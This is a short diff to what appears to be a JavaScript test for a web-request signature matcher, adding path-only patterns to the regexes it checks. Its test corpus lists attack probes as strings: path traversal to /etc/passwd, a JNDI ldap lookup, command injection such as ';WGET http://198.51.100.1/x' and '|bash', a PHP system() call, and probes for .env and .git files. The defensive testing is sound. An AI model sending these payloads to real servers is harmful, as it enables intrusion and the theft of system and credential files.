@@ -232,7 +232,7 @@ test("the literal prefilter never hides a match (every regex's literal is really
   const corpus = [...new Set([...(globalThis.__corpus || []), "/.env", "/x/.ENV.local", "/%2e%2e/etc/passwd", "/a?b=${jndi:ldap://x}", "/cgi-bin/luci/;stok=/locale?form=country", "/?-d allow_url_include=1",
     "/wp-login.php", "/PHPMYADMIN/", "/x?cmd=;WGET http://198.51.100.1/x", "/x?a=rO0ABXNyABdqYXZhLnV0aWwu", "/HNAP1/", "/containers/json", "/.git/HEAD", "/Alfa.PHP", "/x?q=a${IFS}b",
     "/x?q=1|bash", "/x?q=`id`", "/x?q=$(id)", "/x?u=file:///etc/passwd", "/?x=<?php system(1) ?>", "/a/..;/b", "/x\\..\\y", "/api/v1/items/1?page=2", "/assets/app.js"])];
-  const all = [...SIGNATURES, ...UA_SIGNATURES].flatMap((s) => s.res);
+  const all = [...SIGNATURES, ...UA_SIGNATURES].flatMap((s) => [...s.res, ...(s.pathOnly || [])]);
   const m = new Matcher(all);
   for (const str of corpus) {
     const cand = m.candidates(str);
